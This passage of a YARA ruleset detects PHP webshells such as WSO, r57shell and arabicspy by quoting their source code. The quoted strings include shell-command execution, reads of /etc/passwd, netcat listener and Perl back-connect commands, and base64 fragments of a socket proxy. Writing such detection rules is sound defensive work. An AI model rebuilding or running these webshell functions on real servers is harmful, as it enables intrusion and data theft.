      $x3 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x4 = "if ($this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\")) return true;" fullword ascii
      $x5 = "$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');" fullword ascii
      $s6 = "for ($i = strlen($_POST['p3']) - 1;$i >= 0;--$i) $perms+= (int)$_POST['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));" fullword ascii
      $s7 = "if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array('type' => 'file'));" fullword ascii
      $s8 = "if (function_exists('mysql_get_client_info')) $temp[] = \"MySql (\" . mysql_get_client_info() . \")\";" fullword ascii
      $s9 = "foreach ($_POST['tbl'] as $v) $db->dump($v);" fullword ascii
      $s10 = "\"listfileattributesonaLinuxsecondextendedfilesystem\" => \"lsattr - va\"," fullword ascii
      $s11 = "foreach ($charsets as $item) $opt_charsets.= '<option value=\"' . $item . '\" ' . ($_POST['charset'] == $item ? 'selected'" fullword ascii
      $s12 = "header(\"Content-Disposition: attachment; filename=\" . basename($_POST['p1']));" fullword ascii
      $s13 = "echo '<option value=\"' . $value . '\" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';" fullword ascii
      $s14 = "\"findconfig . inc . phpfiles\" => \"find / -typef - nameconfig . inc . php\"," fullword ascii
      $s15 = "if (!function_exists(\"posix_getgrgid\") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid') === false)) {" fullword ascii
      $s16 = "if (!function_exists(\"posix_getpwuid\") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid') === false)) {" fullword ascii
      $s17 = "if (function_exists('pg_connect')) $temp[] = \"PostgreSQL\";" fullword ascii
      $s18 = "$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(\"" fullword ascii
      $s19 = "else die('<script>g(null,null,\"' . urlencode($_POST['p3']) . '\",null,\"\")</script>');" fullword ascii
      $s20 = "if (preg_match('!s_([A-z]+)_(\\d{1})!', $_POST['p1'], $match)) $sort = array($match[1], (int)$match[2]);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _adminer_4_1_0_mysql_adminer_4_2_4_2_73
{
   meta:
      description = "php17 - from files adminer-4.1.0_mysql.php, adminer-4.2.4_2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "21f2c335b1d7810398862df20ab65ab1c67b188ce80f71d11fe32071f0894ebe"
      hash2 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
   strings:
      $x1 = "\"sql\"])||isset($_GET[\"dump\"])||isset($_GET[\"database\"])||isset($_GET[\"processlist\"])||isset($_GET[\"privileges\"])||isse" ascii
      $s2 = "dumpOutput(){$J=array('text'=>lang(57),'file'=>lang(58));if(function_exists('gzencode'))$J['gz']='gzip';return$J;}function" fullword ascii
      $s3 = "get_rows(\"SELECT * FROM pg_stat_activity ORDER BY \".($h->server_info<9.2?\"procpid\":\"pid\"));}function" fullword ascii
      $s4 = "get_schema(){global$h;return$h->result(\"SELECT sys_context('USERENV', 'SESSION_USER') FROM dual\");}function" fullword ascii
      $s5 = "fk_support($R){global$h;return!$h->result(\"SELECT sqlite_compileoption_used('OMIT_FOREIGN_KEY')\");}function" fullword ascii
      $s6 = "get_schema(){global$h;if($_GET[\"ns\"]!=\"\")return$_GET[\"ns\"];return$h->result(\"SELECT SCHEMA_NAME()\");}function" fullword ascii
      $s7 = "found_rows($R,$Z){global$h;return$h->_db->selectCollection($_GET[\"select\"])->count($Z);}function" fullword ascii
      $s8 = "logged_user(){global$h;return$h->result(\"SELECT SUSER_NAME()\");}function" fullword ascii
      $s9 = "logged_user(){global$h;return$h->result(\"SELECT USER FROM DUAL\");}function" fullword ascii
      $s10 = "explain($h,$H){$h->query(\"EXPLAIN PLAN FOR $H\");return$h->query(\"SELECT * FROM plan_table\");}function" fullword ascii
      $s11 = "<tr><th>',lang(34),'<td><input type=\"password\" name=\"auth[password]\">" fullword ascii
      $s12 = "an>\".(support(\"sql\")?\" <a href='\".h(ME).\"sql=\".urlencode($H).\"'>\".lang(10).\"</a>\":\"\").\"</p>\";}function" fullword ascii
      $s13 = "<tr><th>',lang(35),'<td><input name=\"auth[db]\" value=\"',h($_GET[\"db\"]);?>\" autocapitalize=\"off\">" fullword ascii
      $s14 = "logged_user(){global$h;return$h->result(\"SELECT USER()\");}function" fullword ascii
      $s15 = "array_fill_keys($h->_db->getCollectionNames(true),'table');}function" fullword ascii
      $s16 = "logged_user(){global$h;return$h->result(\"SELECT user\");}function" fullword ascii
      $s17 = ".\"<th>\".lang(32).\"<th>&nbsp;</thead>\\n\";while($K=$I->fetch_assoc())echo'<tr'.odd().'><td>'.h($K[\"User\"]).\"<td>\".h($K[\"" ascii
      $s18 = "GET[\"host\"])&&($I=$h->query(\"SHOW GRANTS FOR \".q($ha).\"@\".q($_GET[\"host\"])))){while($K=$I->fetch_row()){if(preg_match('~" ascii
      $s19 = "indexes($Q,$i=null){$J=array();foreach(get_rows(\"SELECT uic.*, uc.constraint_type" fullword ascii
      $s20 = "et($_GET[\"schema\"])?'<input type=\"hidden\" name=\"schema\" value=\"\">':(isset($_GET[\"dump\"])?'<input type=\"hidden\" name=" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _20784cd31c22ddaa849b6c93042df34c1d462ab9_a9b8077357065b95c2bc7f3ffa7baea65895d920_74
{
   meta:
      description = "php17 - from files 20784cd31c22ddaa849b6c93042df34c1d462ab9.php, a9b8077357065b95c2bc7f3ffa7baea65895d920.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash2 = "623d482f0f99bd37b67b2e98b697b7a19c08b2e296fd83fed439627b5a30cd3b"
   strings:
      $s1 = "$head = '<!-- &#1047;&#1076;&#1088;&#1072;&#1074;&#1089;&#1090;&#1074;&#1091;&#1081;  &#1042;&#1072;&#1089;&#1103; -->" fullword ascii
      $s2 = "$language='ru' - &#1072;&#1085;&#1075;&#1083;&#1080;&#1081;&#1089;&#1082;&#1080;&#1081;" fullword ascii
      $s3 = "/* ~~~ &#1040;&#1091;&#1090;&#1077;&#1085;&#1090;&#1080;&#1092;&#1080;&#1082;&#1072;&#1094;&#1080;&#1103; ~~~ */" fullword ascii
      $s4 = ";&#1080;&#1074;&#1103;&#1079;&#1082;&#1072; &#1077;&#1075;&#1086; &#1082; /bin/bash'," fullword ascii
      $s5 = "$language='eng' - &#1088;&#1091;&#1089;&#1089;&#1082;&#1080;&#1081;" fullword ascii
      $s6 = "/*  r57shell.php - &#1089;&#1082;&#1088;&#1080;&#1087;&#1090; &#1085;&#1072; &#1087;&#1093;&#1087; &#1087;&#1086;&#1079;&#1074;&" ascii
      $s7 = "/*  r57shell.php - &#1089;&#1082;&#1088;&#1080;&#1087;&#1090; &#1085;&#1072; &#1087;&#1093;&#1087; &#1087;&#1086;&#1079;&#1074;&" ascii
      $s8 = "'ru_text41'=>'&#1057;&#1086;&#1093;&#1088;&#1072;&#1085;&#1080;&#1090;&#1100; &#1074; &#1092;&#1072;&#1081;&#1083;&#1077;'," fullword ascii
      $s9 = "'ru_text56'=>'&#1053;&#1080;&#1095;&#1077;&#1075;&#1086; &#1085;&#1077; &#1085;&#1072;&#1081;&#1076;&#1077;&#1085;&#1086;'," fullword ascii
      $s10 = "header('WWW-Authenticate: Basic realm=\"shell\"');" fullword ascii
      $s11 = "'ru_text29'=>'&#1044;&#1086;&#1089;&#1090;&#1091;&#1087; &#1079;&#1072;&#1087;&#1088;&#1077;&#1097;&#1077;&#1085;'," fullword ascii
      $s12 = "'ru_text52'=>'&#1058;&#1077;&#1082;&#1089;&#1090; &#1076;&#1083;&#1103; &#1087;&#1086;&#1080;&#1089;&#1082;&#1072;'," fullword ascii
      $s13 = "'ru_text72'=>'&#1058;&#1077;&#1082;&#1089;&#1090; &#1076;&#1083;&#1103; &#1087;&#1086;&#1080;&#1089;&#1082;&#1072;'," fullword ascii
      $s14 = "'ru_butt13'=>'&#1057;&#1086;&#1079;&#1076;&#1072;&#1090;&#1100;/&#1059;&#1076;&#1072;&#1083;&#1080;&#1090;&#1100;'," fullword ascii
      $s15 = "'ru_text32'=>'&#1042;&#1099;&#1087;&#1086;&#1083;&#1085;&#1077;&#1085;&#1080;&#1077; PHP &#1082;&#1086;&#1076;&#1072;'," fullword ascii
      $s16 = "#1080;&#1081; open_basedir &#1095;&#1077;&#1088;&#1077;&#1079; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; cURL'," fullword ascii
      $s17 = "#1080;&#1081; safe_mode &#1095;&#1077;&#1088;&#1077;&#1079; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1102; include'," fullword ascii
      $s18 = ";&#1076;&#1072;&#1083;&#1077;&#1085;&#1085;&#1086;&#1075;&#1086; &#1089;&#1077;&#1088;&#1074;&#1077;&#1088;&#1072;'," fullword ascii
      $s19 = "&#1087; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1076;&#1083;&#1103; &#1095;&#1090;&#1077;&#1085;&#1080;&#1103;!'," fullword ascii
      $s20 = "/* ~~~ &#1053;&#1072;&#1089;&#1090;&#1088;&#1086;&#1081;&#1082;&#1080;  ~~~ */" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _184904fad2bac801b5ffd71da2725ce099c1c077_8d87d250b39b4f622107217f9454c057c76b3ae9_75
{
   meta:
      description = "php17 - from files 184904fad2bac801b5ffd71da2725ce099c1c077.php, 8d87d250b39b4f622107217f9454c057c76b3ae9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "93419ee1a9f3416109cebe714b01364db8c45b9ff1d254ef3d8eff21c593b262"
      hash2 = "ae4d2498d852c2c2908709acc93ef11d8eb6f4ed698c606ec7aa2d76385365aa"
   strings:
      $x1 = ",'selected'=>$execfunc)).' '.$tb->makeinput('command').' '.$tb->makeinput('Run','command','','submit')));" fullword ascii
      $s2 = "$tb->tdbody('<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><b>command [ system , shell_exec , pa" ascii
      $s3 = "$tb->tdbody('<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><b>command [ system , shell_exec , pa" ascii
      $s4 = "echo \"<a href=\\\"$filepath\\\" target=\\\"_blank\\\"><font color='yellow'>$file<STRONG></STRONG></a></td>\\n\";" fullword ascii
      $s5 = "o' id=input><INPUT type='submit' name='shell' value='command shill' id=input></form>\");" fullword ascii
      $s6 = "echo ($proxycontents) ? $proxycontents : \"<body bgcolor=\\\"#F5F5F5\\\" style=\\\"font-size: 12px;\\\"><center><br><p><b>?" fullword ascii
      $s7 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>cmd:</FONT>'.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs" ascii
      $s8 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>cmd:</FONT>'.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs" ascii
      $s9 = "d=input><INPUT type='submit' name='shell' value='command shill' id=input></form>\");" fullword ascii
      $s10 = "Wscript.Shell , exec , popen ]</b></td></tr></table>','center','top');" fullword ascii
      $s11 = "echo '</FONT><strong><FONT COLOR=#9B9B9B>www.alturks.com :</strong><br />';" fullword ascii
      $s12 = "echo (@copy($_FILES['uploadfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadfile']['name'].\"\")) ? \"?" fullword ascii
      $s13 = "if (!ini_get('safe_mode')) die(\"<font size=-2 face=verdana color='#9B9B9B'>Safe-mode is OFF.</font>\");" fullword ascii
      $s14 = "echo\"<tr bgcolor='#cccccc'><td colspan='6' height='5'></td></tr><FORM  method='POST'>\";" fullword ascii
      $s15 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>read file ini_restore:</FONT><br>' .$tb->makeinput('M2','/etc/passwd' ).$t" ascii
      $s16 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>read file :</FONT><br>' .$tb->makeinput('Mohajer22','/etc/passwd' ).$tb->m" ascii
      $s17 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>read file id:</FONT><br>' .$tb->makeid('plugin','cat /etc/passwd' ).$tb->m" ascii
      $s18 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>read file copy:</FONT><br>' .$tb->makeinput('copy','/etc/passwd' ).$tb->ma" ascii
      $s19 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>read file :</FONT><br>' .$tb->makeinput('Mohajer22','/etc/passwd' ).$tb->m" ascii
      $s20 = "$tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>read file CURL:</FONT><br>' .$tb->makeinput('curl','/etc/passwd' ).$tb->ma" ascii
   condition:
      ( uint16(0) == 0x683c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _26aff140c2f73f11d0c78b8823ade092_arabicspy_76
{
   meta:
      description = "php17 - from files 26aff140c2f73f11d0c78b8823ade092.php, arabicspy.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1a96d8b149d930cfea410ba3c247efac03bd71e4fec0460f3522950b1fd13a19"
      hash2 = "9ca895d820411a2b1c4f1f5ca668d10550b897342126ffee1b58f3f1e9d38897"
   strings:
      $s1 = ">makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));" fullword ascii
      $s2 = "21 => array(\"max execution time\",getphpcfg(\"max_execution_time\").\"?" fullword ascii
      $s3 = "<meta name=\"GENERATOR\" content=\"SiteMaker\"><meta http-equiv=\"Content-Language\" content=\"ar-sa\">" fullword ascii
      $s4 = "2  => array(\"??? C??? E? ???????\",gethostbyname($_SERVER['SERVER_NAME']))," fullword ascii
      $s5 = "echo (@copy($_FILES['uploadfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadfile']['name'].\"\")) ? \"EI" fullword ascii
      $s6 = "$tb->tdbody('The Mode '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' The Comand'.$tb-" ascii
      $s7 = "$tb->formheader($action,'E?????','proxyframe');" fullword ascii
      $s8 = "t\">'.$dir_i.' Dir / '.$file_i.' File?</td></tr></table>','center',getrowbg(),'','','6');" fullword ascii
      $s9 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"?" fullword ascii
      $s10 = "$tb->tdbody(\"From?: \".$tb->makeinput('curfile',$file,'readonly').\" To: \".$tb->makeinput('tarfile','?" fullword ascii
      $s11 = "@mysql_connect($servername,$dbusername,$dbpassword) or die(\"E?" fullword ascii
      $s12 = "<span style=\"font-size: 15px; font-family: Verdana\">Hi plz reat the pass word to acsess </span>" fullword ascii
      $s13 = "$tb->tdbody('Chang Chembo Of This To: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));" fullword ascii
      $s14 = "15 => array(\"display errors\",getphpcfg(\"display_errors\"))," fullword ascii
      $s15 = "<td align=\\\"center\\\"><b>\".$title.\" [<a href=\\\"?dir=\".urlencode($dir).\"\\\">C????? ???C??E</a>]??</b></td>\\n\";" fullword ascii
      $s16 = "$filelist=$this -> GetFileList($dir);//I?" fullword ascii
      $s17 = "\".$_POST['regname'].\", \".$_POST['regval'].\", \".$_POST['regtype'].\" E" fullword ascii
      $s18 = "24 => array(\"diskfreespace\",intval(diskfreespace(\".\") / (1024 * 1024)).'Mb')," fullword ascii
      $s19 = "download\"> ??U C???I? ?? C??C?IE ??? C???C?</td></tr></table>');" fullword ascii
      $s20 = "\" src=\"http://www.4ngel.net\"></iframe>');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _5358b9611032c704f509673a35565eca7b36d9bb_a05811ee776c0536a890dba465e501168851df6c_77
{
   meta:
      description = "php17 - from files 5358b9611032c704f509673a35565eca7b36d9bb.php, a05811ee776c0536a890dba465e501168851df6c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a5688bae5f2fecfea22bc43d20390dedb375d5f8278faa322be60388cb899a0b"
      hash2 = "bdae76eb77568d3cfe7e58878ce5520d2e3065d4567b7c9d24d193a012637227"
   strings:
      $x1 = "if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump'" fullword ascii
      $s2 = "wsoSecParam('Downloaders', implode(', ', $temp));" fullword ascii
      $s3 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_" fullword ascii
      $s4 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST" fullword ascii
      $s5 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SE" fullword ascii
      $s6 = "if ($_POST['p1'] == 'yes') if (@unlink(preg_replace('!\\(\\d+\\)\\s.*!', '', __FILE__))) die('Shell has been removed');" fullword ascii
      $s7 = "$out = wsoEx(\"perl /tmp/bc.pl \" . $_POST['p2'] . \" \" . $_POST['p3'] . \" 1>/dev/null 2>&1 &\");" fullword ascii
      $s8 = "if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp" fullword ascii
      $s9 = "if (function_exists('mysql_get_client_info')) $temp[] = \"MySql (\" . mysql_get_client" fullword ascii
      $s10 = "$tmp = array('name' => $dirContent[$i], 'path' => $GLOBALS['cwd'] . $dirCont" fullword ascii
      $s11 = "for ($i = strlen($_POST['p3']) - 1;$i >= 0;--$i) $perms+= (int)$_POS" fullword ascii
      $s12 = "$temp = \"document.getElementById('strOutput').style.display='';document.getE" fullword ascii
      $s13 = "$out = wsoEx(\"perl /tmp/bp.pl \" . $_POST['p2'] . \" 1>/dev/null 2>&1 &\");" fullword ascii
      $s14 = "wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? \"yes <a href='" fullword ascii
      $s15 = "$dirContent[$i]), 'group' => $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]));" fullword ascii
      $s16 = ". ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:" fullword ascii
      $s17 = "elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($" fullword ascii
      $s18 = "T['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));" fullword ascii
      $s19 = "$out = wsoEx(\"perl /tmp/bc.pl \" . $_POST['p2'] . \" \" . $" fullword ascii
      $s20 = "$out = wsoEx(\"perl /tmp/bp.pl \" . $_POST['p2'] . \" 1>/de" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01a00e6583ed3789694d600fa831392aa785c5f9_528f2ab667dc8492e589a00c579edaaf16f03859_aa0fc6f621e8b2965b3a109832117d023f4a1ad6_78
{
   meta:
      description = "php17 - from files 01a00e6583ed3789694d600fa831392aa785c5f9.php, 528f2ab667dc8492e589a00c579edaaf16f03859.php, aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e680486104e6dc00dcf1d07faa73d92bb3505caaffcae2941a5624bf82db6f0"
      hash2 = "5aad1a2e4c160a826e6d62b34f0d1ecc9bd9ffc688774fb055f7e0cf50d08e66"
      hash3 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
   strings:
      $x1 = "$sql_query = \"CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\\\\Winnt\\\\\\Mix.dll';" fullword ascii
      $x2 = "echo \"<font color=blue>Send: site exec</font> <font color=green>\".$_POST[\"SUCommand\"].\"</font><br>\";" fullword ascii
      $s3 = ":$dir/$file</span> |<a href=\\\"?action=editfile&dir=$dir&editfile=$file\\\" target=\\\"_blank\\\">view+edit</a> | $end <br>\";" fullword ascii
      $s4 = "$user = \" <a href=\\\"?action=nowuser\\\" target=\\\"_blank\\\">" fullword ascii
      $s5 = "max_execution_time\",getphpcfg(\"max_execution_time\").\"" fullword ascii
      $s6 = ":<input type=\"checkbox\" name=\"type2\" value=\"getpath\" onclick=\"javascript:alert(\\'" fullword ascii
      $s7 = ": '.gethostbyname($_SERVER['SERVER_NAME']).'</li></ul>','left');" fullword ascii
      $s8 = "elseif ($_GET['action'] == \"downloads\"){" fullword ascii
      $s9 = "while($f=readdir($tempdir)){ if($f==\".\"||$f==\"..\")continue;  find(\"$path/$f\");}" fullword ascii
      $s10 = "\"-MaxUsersLoginPerIP=-1\\r\\n\"." fullword ascii
      $s11 = ": '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','" fullword ascii
      $s12 = "display_errors\",getphpcfg(\"display_errors\"))," fullword ascii
      $s13 = "\"-LoginMesFile=\\r\\n\"." fullword ascii
      $s14 = "\"-AlwaysAllowLogin=0\\r\\n\"." fullword ascii
      $s15 = "\",getfun(\"OCILogOff\"))," fullword ascii
      $s16 = "17 => array(\"magic_quotes_gpc\",getphpcfg(\"magic_quotes_gpc\"))," fullword ascii
      $s17 = "$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'" ascii
      $s18 = "<input type=\"checkbox\" name=\"type\" value=\"list\" onclick=\"javascript:alert(\\'" fullword ascii
      $s19 = "$getpath = htmlspecialchars(substr($msg, $get, $endline)); " fullword ascii
      $s20 = "\"-PasswordType=Regular\\r\\n\"." fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86_1dc03138e5406f8e1f850181e92084ed0f4b5302__79
{
   meta:
      description = "php17 - from files 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 91241fc05105627c2f58942867db10b2b691574e.php, 9f074c6d53409f124b5eeb850502faf587d39a10.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash2 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash3 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash4 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash5 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash6 = "4a30b666f037d28d1b832a95a556d5b15d344fbcfb4756fc1374175e3da9b364"
   strings:
      $x1 = "$res = '[~] Blind Command Execution via [pcntl_exec]\\n\\n';" fullword ascii
      $s2 = "@shell_exec(\"killall -11 httpd\");" fullword ascii
      $s3 = "cmVtb3RlX3BvcnQpID09IDApIHsKY2xvc2UgKFNFU1NJT04pOwpuZXh0Owp9CnByaW50IFJFTU9URSAkZmlyc3Q7CnByaW50IFJFTU9URSAiVXNlci1" fullword ascii
      $s4 = "echo @htmlspecialchars($filedump);" fullword ascii
      $s5 = "b3RlX2hvc3QpIHsKY2xvc2UoU0VTU0lPTik7CmV4aXQ7Cn0KJHJlbW90ZV9wb3J0ID0gImh0dHAiIHVubGVzcyAoJHJlbW90ZV9wb3J0KTsKJGZpcnN" fullword ascii
      $s6 = "luYW1lKCd0Y3AnKTsKbXkgJG15X2FkZHIgID0gc29ja2FkZHJfaW4gKCRwb3J0LCBJTkFERFJfQU5ZKTsKc29ja2V0IChTT0NLLCBBRl9JTkVULCBTT" fullword ascii
      $s7 = "AoMSkgewpuZXh0IHVubGVzcyBteSAkcmVtb3RlX2FkZHIgPSBhY2NlcHQgKFNFU1NJT04sIFNPQ0spOwpteSAoJGZpc3QsICRtZXRob2QsICRyZW1vd" fullword ascii
      $s8 = "BZ2VudDogR29vZ2xlYm90LzIuMSAoK2h0dHA6Ly93d3cuZ29vZ2xlLmNvbS9ib3QuaHRtbClcbiI7CndoaWxlICg8U0VTU0lPTj4pIHsKbmV4dCBpZi" fullword ascii
      $s9 = "9wZW5fY29ubmVjdGlvbiB7Cm15ICgkaG9zdCwgJHBvcnQpID0gQF9bMSwyXTsKbXkgKCRkZXN0X2FkZHIsICRjdXIpOwppZiAoJHBvcnQgIX4gL15cZ" fullword ascii
      $s10 = "TsKfQpwcmludCBSRU1PVEUgIlxuIjsKJGhlYWRlciA9IDE7CndoaWxlICg8UkVNT1RFPikgewpwcmludCBTRVNTSU9OICRfOwppZiAoJGhlYWRlcikg" fullword ascii
      $s11 = "aW5ldF9hdG9uICgkaG9zdCkgb3IgcmV0dXJuIDA7CiRkZXN0X2FkZHIgPSBzb2NrYWRkcl9pbiAoJHBvcnQsICRob3N0KTsKc29ja2V0ICgkX1swXSw" fullword ascii
      $s12 = "DSywgU09NQVhDT05OKSBvciBkaWUgImxpc3RlbigpOiAkISI7CiRTSUd7J0lOVCd9ID0gc3ViIHsKY2xvc2UgKFNPQ0spOwpleGl0Owp9Owp3aGlsZS" fullword ascii
      $s13 = "CRyZW1vdGVfaG9zdCwgJHJlbW90ZV9wb3J0KSA9IAooJGZpcnN0ID1+IG0hKEdFVCkgaHR0cDovLyhbXi86XSspOj8oXGQqKSEgKTsKaWYgKCEkcmVt" fullword ascii
      $s14 = "0NLX1NUUkVBTSwgJHByb3RvY29sKSBvciBkaWUgInNvY2tldCgpOiAkISI7CnNldHNvY2tvcHQgKFNPQ0ssIFNPTF9TT0NLRVQsIFNPX1JFVVNFQURE" fullword ascii
      $s15 = "echo \"<font face=Verdana size=-2><b><div align=center id='n'>Proxy</div></b></font>\";" fullword ascii
      $s16 = "$_POST['cmd'] = '';" fullword ascii
      $s17 = "$str = moreread($_POST['test9_file']);" fullword ascii
      $s18 = "if (@file_exists($temp)) @unlink($temp);" fullword ascii
      $s19 = "$datafile = @implode(\"\", @file($_POST['rem_file']));" fullword ascii
      $s20 = "UiwxICkgb3IgZGllICJzZXRzb2Nrb3B0KCk6ICQhIjsKYmluZCAoU09DSywgJG15X2FkZHIpIG9yIGRpZSAiYmluZCgpOiAkISI7Cmxpc3RlbiAoU09" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1__4__140748a2a279ced57c797f726dcb7ad9a65005e2_5bdae9780fa349f3b58c475985c13c012897bd61_6417f6b4aa685ba8f0c4a0b836dde05f6ae_80
{
   meta:
      description = "php17 - from files 1 (4).php, 140748a2a279ced57c797f726dcb7ad9a65005e2.php, 5bdae9780fa349f3b58c475985c13c012897bd61.php, 6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87.php, 7e594b9fa652d185c4b87ab7080f740f5d7eea2f.php, a7b3b8a66367f3e61183f78bbb82556eb2c2e40b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052f0f91060fa3f6723bfe2c0cc469246b58af699cda72e2b57d2918b8d1f1e9"
      hash2 = "c929f266350e6b936ad98409beb09d99a46c174440b2cc294b1b6440b5dea350"
      hash3 = "af896e0ad20db413c0cc3b5a8cda278400c143b470de54f8ccdf6154592279fd"
      hash4 = "4713738198d1baac37ab2fb1b8906bc8c5e4f4eb064808a051ef89e003ed3f86"
      hash5 = "2e605821bf44cdf64b605ee38090f2e3d9807df8d30e8c1c2640a8f5b4471528"
      hash6 = "6100c932ea14b9264bcf16b46893716650bf412b6c4ecd538b37e3205f7a2dcc"
   strings:
      $x1 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $s2 = "echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '" fullword ascii
      $s3 = "$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip';" fullword ascii
      $s4 = "<a href=\"?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'\" target=\"_blank\"> " fullword ascii
      $s5 = "$Server_Alexa = 'http://cn.alexa.com/siteinfo/'.str_replace('www.','',$_SERVER['SERVER_NAME']);" fullword ascii
      $s6 = "echo ' <a href=\"'.$Fileurls.'\" target=\"_blank\"> <font color=\"#8B0000\"> '.$Filepath.' </font> </a> <br> " fullword ascii
      $s7 = "</a> <a href=\"#\" onclick=\"Delok(\\''.$table[0].'\\',\\'?s=r&db='.$_GET['db'].'&drop='.$table[0].'\\');return false;\"> " fullword ascii
      $s8 = "(nc -l -n -v -p '.$_POST['yourport'].') </div>';" fullword ascii
      $s9 = "<a href=\"?s=h&o=downloader\">[Downloader]</a></div>" fullword ascii
      $s10 = "if(isset($_POST['stasx'])){$features_all = $features_asx; $st = '\\.asp|\\.asa|\\.cer|\\.aspx|\\.ascx|\\;';}" fullword ascii
